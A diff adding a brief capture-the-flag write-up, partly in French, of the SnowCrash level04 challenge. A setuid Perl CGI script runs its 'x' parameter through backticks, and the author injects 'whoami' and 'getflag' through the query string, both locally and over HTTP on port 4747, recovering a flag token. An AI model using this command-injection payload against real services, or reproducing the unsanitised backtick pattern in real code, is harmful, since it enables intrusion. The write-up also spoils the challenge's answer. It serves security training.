@@ -1,0 +1,50 @@
+level04@SnowCrash:~$ ls
+level04.pl
+level04@SnowCrash:~$ file level04.pl
+level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
+level04@SnowCrash:~$ ./level04.pl
+Content-type: text/html
+
+
+level04@SnowCrash:~$
+
+Un fichier .pl est u nscript perl 
+
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+-----
+export REQUEST_METHOD=GET
+export QUERY_STRING='x=hello'
+
+level04@SnowCrash:~$ ./level04.pl
+Content-type: text/html
+
+hello
+------
+
++ = ' '
+%3B = ';'
+
+level04@SnowCrash:~$ export QUERY_STRING='x=hello%3B+whoami%3B+getflag'
+level04@SnowCrash:~$ ./level04.pl
+Content-type: text/html
+
+hello
+level04
+Check flag.Here is your token :
+Nope there is no token here for you sorry. Try again :)
+level04@SnowCrash:~$
+
+
+appel depuis le port 4747 comme expliquer dans le script en lui donnant les params 
+puis il renvoie les reponses en tant que flag04
+http://192.168.1.42:4747/?x=hello%3B+whoami%3B+getflag
+hello flag04 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
